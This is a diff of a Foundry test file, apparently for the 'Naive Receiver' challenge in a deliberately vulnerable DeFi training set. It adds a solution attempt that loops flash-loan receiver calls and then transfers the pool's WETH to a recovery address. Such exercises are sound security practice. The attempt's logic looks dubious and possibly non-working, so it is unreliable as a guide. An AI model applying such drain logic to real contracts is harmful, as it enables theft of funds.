@@ -79,13 +79,15 @@ contract NaiveReceiverChallenge is Test {
     function test_naiveReceiver() public checkSolvedByPlayer {
         // @audit-info hardhat solution
         // 10 transactions
-        // const ETH = await pool.ETH();
+        // const ETH = await pool.WETH();
         // for(let i = 0; i < 10; i++){
         //     await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
         // @audit-info hardhat to foundry
-        // commit 
-        // commit
-        // commit// commit
+        for(uint256 i = 0; i < 10; i++) {
+            FlashLoanReceiver receiverPool = new FlashLoanReceiver(address(pool));
+            receiverPool.onFlashLoan(player, address(weth), 0, 1, "");
+        }
+        weth.transferFrom(player, address(recovery), WETH_IN_POOL + WETH_IN_RECEIVER);
 
     }
 
